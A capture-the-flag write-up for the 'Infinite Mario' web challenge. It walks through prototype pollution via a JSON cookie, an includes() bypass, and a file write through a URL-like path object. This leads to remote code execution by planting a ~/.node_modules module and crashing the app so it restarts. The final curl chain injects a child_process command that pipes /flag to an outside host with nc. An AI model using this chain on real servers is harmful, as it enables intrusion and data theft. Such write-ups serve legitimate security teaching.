---
source: kevin-mizu
source_url: https://mizu.re/post/infinite-mario
title: "Infinite Mario | mizu.re"
description: "Infinite Mario"
---

_keyboard\_arrow\_up_

title: Infinite Mario

date: May 27, 2023

tags: [Writeup](https://mizu.re/tag/Writeup) [Web](https://mizu.re/tag/Web) [Esaip\_2023](https://mizu.re/tag/Esaip_2023) [MyChallenges](https://mizu.re/tag/MyChallenges)

# Infinite Mario

![](https://mizu.re/articles/writeups/esaip_2023/infinite_mario/images/logo.png)

* * *

Difficulty: 500 points \| 1 solves

Description: Mario is stuck in an infiniti loop, find a way to save him from this situation.

Sources: [infinite\_mario.zip](https://mizu.re/articles/writeups/)

Author: [Me :p](https://twitter.com/kevin_mizu)

* * *

## 🕵️ Recon

For this challenge, we have a simple express application with an [infinite mario bros](https://openhtml5games.github.io/games-mirror/dist/mariohtml5/main.html) game in the frontend:

![home.gif](https://mizu.re/articles/writeups/esaip_2023/infinite_mario/images/home.gif)

As we have sources, we can get more information about the backend logic. Thanks to it, we can understand that the only things implemented is a custom logging middleware:

```js
process.chdir("logs/");
var merge = (src, dst) => {
    for (const [key, value] of Object.entries(src)) {
        if (`${value}`.includes("object")) {
            dst[key] = merge(value, typeof dst[key] === "object" ? dst[key] : {});
        } else {
            dst[key] = value || dst[key] || "";
        }
    }
    return dst;
};

// Retracted

app.use("/static", express.static(path.join(__dirname, "static")));
app.use(cookieParser());
app.use((req, res) => {
    var config = merge({
        path: req.cookies.log,
        data: [req.url, req.method, req.headers.referer]
    },{
        path: "all_users.txt",
        data: []
    });

    if (!config.path.includes("/")) {
        fs.writeFile(config.path, config.data.join(" | "), (e) => {
            if (e) {
                fs.mkdir(config.path, { recursive: true }, (e) => {
                    if (e) {
                        throw new Error(e);
                    }
                });
            } else {
                console.log(`[LOG] Log saved into: ${config.path}.`);
            }
        })
    }

    req.next();
})
```

As we can see from the above snippet, it takes the req.cookies.log value as a file path and log req.url, req.method and req.headers.referer. Furthermore, we know that the flag is located at the root of the Docker. Thus, we most probably need to find a way to get an RCE.

## 🏭 Prototype pollution

Something interesting about the logging system is that it uses a custom merge function which is vulnerable to prototype pollution:

![pollution.png](https://mizu.re/articles/writeups/esaip_2023/infinite_mario/images/pollution.png)

To trigger the pollution, we need to be able to provide an object inside the req.cookies.log value. At the first place, it could look impossible, but thanks to the cookieParser middleware, we can prepend the cookie value by j: to specify that the content is a JSON Object!

- [\[cookie-parser\] index.js](https://github.com/expressjs/cookie-parser/blob/e5862bdb0c1130450a5b50bc07719becf0ab8c81/index.js#L83)

```js
function JSONCookie (str) {
    if (typeof str !== 'string' || str.substr(0, 2) !== 'j:') {
        return undefined
    }

    try {
        return JSON.parse(str.slice(2))
    } catch (err) {
        return undefined
    }
}
```

Thus, using the following log cookie value will trigger the pollution:

```
j:{"__proto__": {"polluted": true}}
```

## 📁 File Write (FW)

Now that we have a prototype pollution, we need to find a way to use it to bypass the following restriction:

```js
if (!config.path.includes("/")) {
    // Retracted
}
```

The problem here, is that includes method is only associated with and Array or String object:

- [String](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/includes)
- [Array](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/includes)

In addition, it is impossible to have an Array as the merge function result, which blocks any basic type juggling exploitation.

![array.png](https://mizu.re/articles/writeups/esaip_2023/infinite_mario/images/array.png)

Therefore, thanks to the prototype pollution, it is possible to overwrite the \_\_proto\_\_ value by an Array which will add the includes method in the prototype chain:

![includes.png](https://mizu.re/articles/writeups/esaip_2023/infinite_mario/images/includes.png)

![prototype_chain.png](https://mizu.re/articles/writeups/esaip_2023/infinite_mario/images/prototype_chain.png)

Thanks to the previous tricks, it is possible to to bypass the .includes("/") check. Unfortunately, it would makes the fs.writeFile function crash:

![error.png](https://mizu.re/articles/writeups/esaip_2023/infinite_mario/images/error.png)

Therefore, thanks to a magic trick, it is possible to make it a valid input 👀

Reading the nodeJs documentation, we can see that fs.writeFile function accepts an URL object as filename:

![nodejs.png](https://mizu.re/articles/writeups/esaip_2023/infinite_mario/images/nodejs.png)

If we dig into the fs.writeFile source code we can see the following call tree:

- [\[node\] node/lib/fs.js -> fs.writeFile](https://github.com/nodejs/node/blob/258e9e767e3d048dae69658d4019a93906522a42/lib/fs.js#L2270)

```js
function writeFile(path, data, options, callback) {
    // Retracted

    fs.open(path, flag, options.mode, (openErr, fd) => { // <-- Path used here
        // Retracted
    });
}
```

- [\[node\] node/lib/fs.js -> fs.open](https://github.com/nodejs/node/blob/258e9e767e3d048dae69658d4019a93906522a42/lib/fs.js#L552)

```js
function open(path, flags, mode, callback) {
    path = getValidatedPath(path); // <-- Verify path here

    // Retracted
}
```

- [\[node\] node/lib/internal/fs/utils.js -> getValidatedPath](https://github.com/nodejs/node/blob/258e9e767e3d048dae69658d4019a93906522a42/lib/fs.js#L552)

```js
const getValidatedPath = hideStackFrames((fileURLOrPath, propName = 'path') => {
    const path = toPathIfFileURL(fileURLOrPath); // Normalise URL path here
    validatePath(path, propName);
    return path;
});
```

- [\[node\] node/lib/internal/fs/utils.js -> toPathIfFileURL](https://github.com/nodejs/node/blob/8085bcf88277cf2b474af008e1e150ce72af5b03/lib/internal/url.js#LL1332C10-L1332C25)

```js
function toPathIfFileURL(fileURLOrPath) {
    if (!isURLInstance(fileURLOrPath)) // Verify URL path type here
        return fileURLOrPath;
    return fileURLToPath(fileURLOrPath); // Normalise URL path here
}
```

- [\[node\] node/lib/internal/fs/utils.js -> isURLInstance](https://github.com/nodejs/node/blob/8085bcf88277cf2b474af008e1e150ce72af5b03/lib/internal/url.js#LL1328C1-L1330C2)

```js
function isURLInstance(fileURLOrPath) {
    return fileURLOrPath != null && fileURLOrPath.href && fileURLOrPath.origin; // URL path object simply need href & origin to be set
}
```

- [\[node\] node/lib/internal/fs/utils.js -> fileURLToPath](https://github.com/nodejs/node/blob/8085bcf88277cf2b474af008e1e150ce72af5b03/lib/internal/url.js#LL1249C1-L1257C2)

```js
function fileURLToPath(path) {
    // Retracted

    if (path.protocol !== 'file:') // Protocol must be file
        throw new ERR_INVALID_URL_SCHEME('file');
    return isWindows ? getPathFromURLWin32(path) : getPathFromURLPosix(path); // Get path value
}
```

- [\[node\] node/lib/internal/fs/utils.js -> getPathFromURLPosix](https://github.com/nodejs/node/blob/8085bcf88277cf2b474af008e1e150ce72af5b03/lib/internal/url.js#LL1231C1-L1247C2)

```js
function getPathFromURLPosix(url) {
    if (url.hostname !== '') { // Hostname must be set
        throw new ERR_INVALID_FILE_URL_HOST(platform);
    }
    const pathname = url.pathname; // File path comes from pathname

    // Retracted

    return decodeURIComponent(pathname);
}
```

Thus, if we regroup the previous information into one payload, we can get the following working exploit 🔥

![file_write.png](https://mizu.re/articles/writeups/esaip_2023/infinite_mario/images/file_write.png)

_Another writeup speaking about this technique: [link](https://viblo.asia/p/corctf-2022-writeup-part-1-m68Z0Joj5kG)._

## 💥 RCE

Now that we have a FW thanks to the JSON cookie \+ prototype pollution \+ URL path, we need to find a way to leverage that to RCE. If we look closer into the application source code, something might catch your eyes:

```js
const mongodb = require("mongodb");
```

The mongodb library is imported but never used. This is a really important point because, if we use strace and grep no such file we can find:

```bash
strace node app.js 2>&1 | grep "home" | grep "No such file"
```

![no_such_file_1.png](https://mizu.re/articles/writeups/esaip_2023/infinite_mario/images/no_such_file_1.png)

If we create the .node\_modules in the home directory and do an strace again, we get:

```bash
mkdir ~/.node_modules/
```

![no_such_file_2.png](https://mizu.re/articles/writeups/esaip_2023/infinite_mario/images/no_such_file_2.png)

Now, create a .js that doesn't exist, append console.log(1) into it and rerun the application:

```bash
echo "console.log(1)" > ~/.node_modules/kerberos.js
```

![kerb_exec.png](https://mizu.re/articles/writeups/esaip_2023/infinite_mario/images/kerb_exec.png)

As you can see, we get a code execution when the application starts 🔥

Thus, to get an RCE on the challenge instance, we need to find how to do the following:

- How to create the ~/.node\_modules directory.
- How to make the application restart.

The first one is pretty simple to do because, thanks to the FW vulnerability and the following code, we can create any directory we want to:

```js
fs.writeFile(config.path, config.data.join(" | "), (e) => {
    if (e) {
        fs.mkdir(config.path, { recursive: true }, (e) => {
            if (e) {
                throw new Error(e);
            }
        });
    } else {
        console.log(`[LOG] Log saved into: ${config.path}.`);
    }
})
```

For the second condition, there is something important to know about express. In fact, it prevent an application to crash in case of an error in the main process, therefore this protection isn't applied in case of child process.

In addition, in the above code, the in the fs.mkdir callback, there is a throw new Error(e) which is not handled by a try catch. In addition, fs.mkdir spawn a new process which could be used to make the application crash. Finally, taking a look into the Dockerfile entrypoint, we can see that the application is automatically restart if it cash 🔥

```dockerfile
CMD ["/bin/sh", "-c", "while true; do node /usr/app/app.js; done"]
```

Thus, to get the RCE we need to:

1. Trigger a prototype pollution via a JSON cookie inside the merge function.
2. Bypass .includes by polluting the object prototype by an array prototype.
3. Use an URL object path to write the payload into /home/challenge/.node\_modules/kerberos.js file.
4. Make the application crashes thanks to the subprocess error.

## 💥 Chain everything together

```sh
# Create malicious folder
curl -H 'Cookie: log=j:{"origin":"random","href":"random","protocol":"file:","hostname":"","pathname":"/home/challenge/.node_modules/","__proto__":[]}'  http://localhost:3000/

# Backdoor the application
curl -H 'Referer: */require("child_process").exec("cat /flag | nc mizu.re 4444")' -H 'Cookie: log=j:{"origin":"random","href":"random","protocol":"file:","hostname":"","pathname":"/home/challenge/.node_modules/kerberos.js","__proto__":[]}'  http://localhost:3000/*

# Trigger the payload
curl -H 'Cookie: log=j:{"origin":"random","href":"random","protocol":"file:","hostname":"","pathname":"/a/a/a","__proto__":[]}'  http://localhost:3000/
```

## 🚩 Retrieve the flag

![flag.png](https://mizu.re/articles/writeups/esaip_2023/infinite_mario/images/flag.png)

Flag: ECTF{N0d3jS\_F1l3\_Wr1T3\_2\_Rc3} 🎉

[_keyboard\_arrow\_left_ XSS me luigi](https://mizu.re/post/xss-me-luigi)

[YouWatch _keyboard\_arrow\_right_](https://mizu.re/post/youwatch)